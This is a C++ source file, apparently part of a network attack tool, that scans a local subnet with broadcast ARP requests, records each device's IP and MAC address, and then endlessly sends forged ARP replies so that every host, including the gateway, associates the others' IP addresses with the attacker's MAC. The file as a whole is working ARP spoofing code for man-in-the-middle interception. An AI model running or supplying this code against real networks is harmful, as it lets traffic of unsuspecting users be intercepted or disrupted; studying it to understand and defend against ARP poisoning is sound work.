#include "arp.hpp"

/*
Save the available devices' IP and MAC into IP-MAC pair
Print the available devices' IP and MAC
*/
void parseARPReply(uint8_t *buffer, std::map<std::vector<uint8_t>, std::vector<uint8_t>> &ip_mac_pairs, AccessInfo info) {
    arp_hdr arphdr = *reinterpret_cast<arp_hdr*>(buffer + ETH_HDRLEN);

    // printf("%d\n", ntohs(arphdr.opcode));
    
    std::vector<uint8_t> sender_mac(arphdr.sender_mac, arphdr.sender_mac + 6);
    std::vector<uint8_t> sender_ip(arphdr.sender_ip, arphdr.sender_ip + 4);
    // arphdr.sender_mac.assign(buffer + ETH_HDRLEN + 8, buffer + ETH_HDRLEN + 8 + 6);
    // arphdr.sender_ip.assign(buffer + ETH_HDRLEN + 8 + 6, buffer + ETH_HDRLEN + 8 + 6 + 4);

    // Check if ARP packet is a response
    if (ntohs(arphdr.opcode) == ARPOP_REPLY) {
        // If the IP address is the gateway IP, return
        if (arphdr.sender_ip[0] == (info.gateway_ip.sin_addr.s_addr & 0xff) &&
            arphdr.sender_ip[1] == ((info.gateway_ip.sin_addr.s_addr >> 8) & 0xff) &&
            arphdr.sender_ip[2] == ((info.gateway_ip.sin_addr.s_addr >> 16) & 0xff) &&
            arphdr.sender_ip[3] == ((info.gateway_ip.sin_addr.s_addr >> 24) & 0xff)) {
            // printf("gateway: %d.%d.%d.%d\n", arphdr.sender_ip[0], arphdr.sender_ip[1], arphdr.sender_ip[2], arphdr.sender_ip[3]);

            ip_mac_pairs[sender_ip] = sender_mac;
            return;
        }

        // If the IP address is local IP, return
        if (arphdr.sender_ip[0] == (info.src_ip.sin_addr.s_addr & 0xff) &&
            arphdr.sender_ip[1] == ((info.src_ip.sin_addr.s_addr >> 8) & 0xff) &&
            arphdr.sender_ip[2] == ((info.src_ip.sin_addr.s_addr >> 16) & 0xff) &&
            arphdr.sender_ip[3] == ((info.src_ip.sin_addr.s_addr >> 24) & 0xff)) {
            // printf("local: %d.%d.%d.%d\n", arphdr.sender_ip[0], arphdr.sender_ip[1], arphdr.sender_ip[2], arphdr.sender_ip[3]);

            return;
        }

        // If the IP address has already in the ip_mac_pairs, return
        if (ip_mac_pairs.find(sender_ip) != ip_mac_pairs.end()) {
            // printf("repeat: %d.%d.%d.%d\n", arphdr.sender_ip[0], arphdr.sender_ip[1], arphdr.sender_ip[2], arphdr.sender_ip[3]);
            return;
        }

        // Save IP-MAC pair
        ip_mac_pairs[sender_ip] = sender_mac;

        // Print source IP address
        printf("%d.%d.%d.%d\t\t", arphdr.sender_ip[0], arphdr.sender_ip[1], arphdr.sender_ip[2], arphdr.sender_ip[3]);
        // Print source MAC address
        for (int i = 0; i < 5; i++) {
            printf("%02x:", arphdr.sender_mac[i]);
        }
        printf("%02x\n", arphdr.sender_mac[5]);
    }
}

/*
Function to send fake ARP replies
Make the devices in the IP-MAC pair think that the other devices' MAC address is the attacker's MAC address
 */
void sendSpoofedARPReply(int sd, std::map<std::vector<uint8_t>, std::vector<uint8_t>> &ip_mac_pairs, AccessInfo info) {
    arp_hdr arphdr;
    arphdr.htype = htons(1);                    // Hardware type (16 bits): 1 for ethernet
    arphdr.ptype = htons(ETH_P_IP);             // Protocol type (16 bits): 2048 for IP
    arphdr.hlen = 6;                            // Hardware address length (8 bits): 6 bytes for MAC address
    arphdr.plen = 4;                            // Protocol address length (8 bits): 4 bytes for IPv4 address
    arphdr.opcode = htons(ARPOP_REPLY);         // OpCode: 2 for ARP reply
    int frame_length = 6 + 6 + 2 + ARP_HDRLEN;  // Ethernet frame length = ethernet header (MAC + MAC + ethernet type) + ethernet data (ARP header)
    std::vector<uint8_t> ether_frame(IP_MAXPACKET);

    ether_frame[12] = ETH_P_ARP / 256;
    ether_frame[13] = ETH_P_ARP % 256;
    while (true) {
        for (auto i = ip_mac_pairs.begin(); i != ip_mac_pairs.end(); i++) {
            // printf("ip: %d.%d.%d.%d\n", i->first[0], i->first[1], i->first[2], i->first[3]);
            for (auto j = ip_mac_pairs.begin(); j != ip_mac_pairs.end(); j++) {
                // printf("ip: %d.%d.%d.%d\n", j->first[0], j->first[1], j->first[2], j->first[3]);
                if (i == j) continue;  // Skip sending to self

                // Construct and send fake ARP reply
                std::copy(info.src_mac.begin(), info.src_mac.end(), arphdr.sender_mac);
                std::copy(j->first.begin(), j->first.end(), arphdr.sender_ip);
                std::copy(i->second.begin(), i->second.end(), arphdr.target_mac);
                std::copy(i->first.begin(), i->first.end(), arphdr.target_ip);
                // printf("sender_mac: %02x:%02x:%02x:%02x:%02x:%02x\n", arphdr.sender_mac[0], arphdr.sender_mac[1], arphdr.sender_mac[2], arphdr.sender_mac[3], arphdr.sender_mac[4], arphdr.sender_mac[5]);
                // printf("sender_ip: %d.%d.%d.%d\n", arphdr.sender_ip[0], arphdr.sender_ip[1], arphdr.sender_ip[2], arphdr.sender_ip[3]);
                // printf("target_mac: %02x:%02x:%02x:%02x:%02x:%02x\n", arphdr.target_mac[0], arphdr.target_mac[1], arphdr.target_mac[2], arphdr.target_mac[3], arphdr.target_mac[4], arphdr.target_mac[5]);
                // printf("target_ip: %d.%d.%d.%d\n", arphdr.target_ip[0], arphdr.target_ip[1], arphdr.target_ip[2], arphdr.target_ip[3]);
                
                // Destination and Source MAC addresses
                std::copy(i->second.begin(), i->second.end(), ether_frame.begin());
                std::copy(info.src_mac.begin(), info.src_mac.end(), ether_frame.begin() + 6);

                // ARP header
                memcpy(ether_frame.data() + ETH_HDRLEN, &arphdr, ARP_HDRLEN * sizeof(uint8_t));

                // Send ethernet frame to socket.
                if (sendto(sd, ether_frame.data(), frame_length, 0, (struct sockaddr *)&info.device, sizeof(info.device)) < 0) {
                    perror("sendto() failed");
                    exit(EXIT_FAILURE);
                }
            }
        }
        std::this_thread::sleep_for(std::chrono::seconds(1));  // Sleep for a while
    }
}

/*
Function to send ARP request to the whole subnet
Used to get the MAC address and IP of all devices in the subnet
*/
void sendARPRequest(int sd, AccessInfo info) {
    int frame_length;
    int bytes;
    arp_hdr arphdr;
    std::vector<uint8_t> dst_mac(6, 0xff);
    std::vector<uint8_t> ether_frame(IP_MAXPACKET);

    // Copy IP address from sockaddr_in to sender_ip
    uint8_t* local_ip = reinterpret_cast<uint8_t *>(&info.src_ip.sin_addr.s_addr);
    // arphdr.sender_ip.assign(local_ip, local_ip + 4);
    std::copy(local_ip, local_ip + 4, arphdr.sender_ip);
    // printf("sender_ip: %d.%d.%d.%d\n", arphdr.sender_ip[0], arphdr.sender_ip[1], arphdr.sender_ip[2], arphdr.sender_ip[3]);

    // Fill out sockaddr_ll.
    info.device.sll_family = AF_PACKET;
    std::copy(info.src_mac.begin(), info.src_mac.end(), info.device.sll_addr);
    info.device.sll_halen = htons(6);

    // ARP header
    arphdr.htype = htons(1);                                                                     // Hardware type (16 bits): 1 for ethernet
    arphdr.ptype = htons(ETH_P_IP);                                                              // Protocol type (16 bits): 2048 for IP
    arphdr.hlen = 6;                                                                             // Hardware address length (8 bits): 6 bytes for MAC address
    arphdr.plen = 4;                                                                             // Protocol address length (8 bits): 4 bytes for IPv4 address
    arphdr.opcode = htons(ARPOP_REQUEST);                                                        // OpCode: 1 for ARP request
    // arphdr.sender_mac.assign(info.src_mac.begin(), info.src_mac.end());
    std::copy(info.src_mac.begin(), info.src_mac.end(), arphdr.sender_mac);
    // printf("sender_mac: %02x:%02x:%02x:%02x:%02x:%02x\n", arphdr.sender_mac[0], arphdr.sender_mac[1], arphdr.sender_mac[2], arphdr.sender_mac[3], arphdr.sender_mac[4], arphdr.sender_mac[5]);
    std::fill(arphdr.target_mac, arphdr.target_mac + 6, 0);                                      // Target hardware address (48 bits): zero

    // Fill out ethernet frame header.
    frame_length = ETH_HDRLEN + ARP_HDRLEN;  // Ethernet frame length = ethernet header (MAC + MAC + ethernet type) + ethernet data (ARP header)

    // Destination and Source MAC addresses
    std::copy(dst_mac.begin(), dst_mac.end(), ether_frame.begin());
    std::copy(info.src_mac.begin(), info.src_mac.end(), ether_frame.begin() + 6);

    // Ethernet type code (ETH_P_ARP for ARP).
    // http://www.iana.org/assignments/ethernet-numbers
    ether_frame[12] = ETH_P_ARP / 256;
    ether_frame[13] = ETH_P_ARP % 256;
    uint32_t base_ip_net = ntohl(info.src_ip.sin_addr.s_addr) & ntohl(info.netmask.sin_addr.s_addr);
    uint32_t mask_net = ntohl(~info.netmask.sin_addr.s_addr);

    for (uint32_t i = 1; i < mask_net; i++) {
        uint32_t dest_ip = htonl(base_ip_net | i);

        uint8_t* dest_ip8 = reinterpret_cast<uint8_t *>(&dest_ip);
        // arphdr.target_ip.assign(dest_ip8, dest_ip8 + 4);
        std::copy(dest_ip8, dest_ip8 + 4, arphdr.target_ip);
        // printf("target_ip: %d.%d.%d.%d\n", arphdr.target_ip[0], arphdr.target_ip[1], arphdr.target_ip[2], arphdr.target_ip[3]);

        // ARP header
        // memcpy(ether_frame.data() + ETH_HDRLEN, &arphdr, ARP_HDRLEN);
        std::copy(reinterpret_cast<uint8_t*>(&arphdr), reinterpret_cast<uint8_t*>(&arphdr) + ARP_HDRLEN, ether_frame.begin() + ETH_HDRLEN);

        // Send ethernet frame to socket.
        if ((bytes = sendto(sd, ether_frame.data(), frame_length, 0, (struct sockaddr *)&info.device, sizeof(info.device))) < 0) {
            perror("sendto() failed");
            exit(EXIT_FAILURE);
        }
    }
}